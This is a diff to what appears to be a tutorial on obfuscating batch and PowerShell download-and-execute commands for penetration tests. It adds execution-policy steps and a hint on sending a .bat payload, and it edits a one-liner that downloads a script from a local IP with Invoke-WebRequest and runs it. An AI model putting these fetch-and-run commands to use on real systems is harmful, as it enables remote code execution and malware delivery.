@@ -37,6 +37,7 @@
       To conduct this kind of tests (In powershell) we need to allow the execution of powershell scripts.
                  1º - Start Windows PowerShell with the "Run as Administrator" option.
                  2º - Execute the follow in terminal: set-executionpolicy remotesigned
+                 3º - To revert group policy to default: set-executionpolicy restricted
 
 
 **Bad character sellection** [ batch escape character -used- in powershell interpreter ]
@@ -229,6 +230,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       exit
 
 ![batch obfuscation certutil.bat](http://i.cubeupload.com/PXBWog.jpg)
+`HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />
 
 ---
 
@@ -669,7 +671,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - File **Invoke-WebRequest.ps1** (trigger download/execution)
 
-      Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; powershell.exe -File Invoke-Hello.ps1
+      Invoke-WebRequest "http://192.168.1.71/Invoke-Hello.ps1" -OutFile "Invoke-Hello.ps1" -PassThru; Start-Sleep 1; powershell.exe -File Invoke-Hello.ps1
 
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/1YYzR3.jpg)
 
